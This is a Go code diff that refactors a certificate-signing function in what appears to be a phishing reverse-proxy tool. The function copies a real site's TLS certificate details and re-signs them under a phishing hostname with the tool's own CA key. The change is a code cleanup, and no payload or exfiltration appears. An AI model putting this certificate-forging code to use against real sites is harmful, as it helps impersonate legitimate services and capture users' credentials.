@@ -445,34 +445,34 @@ func (d *CertDb) SignCertificateForHost(host string, phish_host string, port int
 		srvCert := d.getServerCertificate(host, port)
 		if srvCert == nil {
 			return nil, fmt.Errorf("failed to get TLS certificate for: %s", host)
-		} else {
-			serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
-			serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
-			if err != nil {
-				return nil, err
-			}
-
-			template = x509.Certificate{
-				SerialNumber:          serialNumber,
-				Issuer:                x509ca.Subject,
-				Subject:               srvCert.Subject,
-				NotBefore:             srvCert.NotBefore,
-				NotAfter:              srvCert.NotAfter,
-				KeyUsage:              srvCert.KeyUsage,
-				ExtKeyUsage:           srvCert.ExtKeyUsage,
-				IPAddresses:           srvCert.IPAddresses,
-				DNSNames:              []string{phish_host},
-				BasicConstraintsValid: true,
-			}
-			template.Subject.CommonName = phish_host
 		}
+		serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
+		serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
+		if err != nil {
+			return nil, err
+		}
+
+		template = x509.Certificate{
+			SerialNumber:          serialNumber,
+			Issuer:                x509ca.Subject,
+			Subject:               srvCert.Subject,
+			NotBefore:             srvCert.NotBefore,
+			NotAfter:              srvCert.NotAfter,
+			KeyUsage:              srvCert.KeyUsage,
+			ExtKeyUsage:           srvCert.ExtKeyUsage,
+			IPAddresses:           srvCert.IPAddresses,
+			DNSNames:              []string{phish_host},
+			BasicConstraintsValid: true,
+		}
+		template.Subject.CommonName = phish_host
+
 	}
 
 	var pkey *rsa.PrivateKey
 	if pkey, err = rsa.GenerateKey(rand.Reader, 1024); err != nil {
 		return nil, err
 	}
-	
+
 	var derBytes []byte
 	if derBytes, err = x509.CreateCertificate(rand.Reader, &template, x509ca, &pkey.PublicKey, d.CACert.PrivateKey); err != nil {
 		return nil, err
@@ -486,4 +486,3 @@ func (d *CertDb) SignCertificateForHost(host string, phish_host string, port int
 	d.tls_cache[host] = cert
 	return cert, nil
 }
-
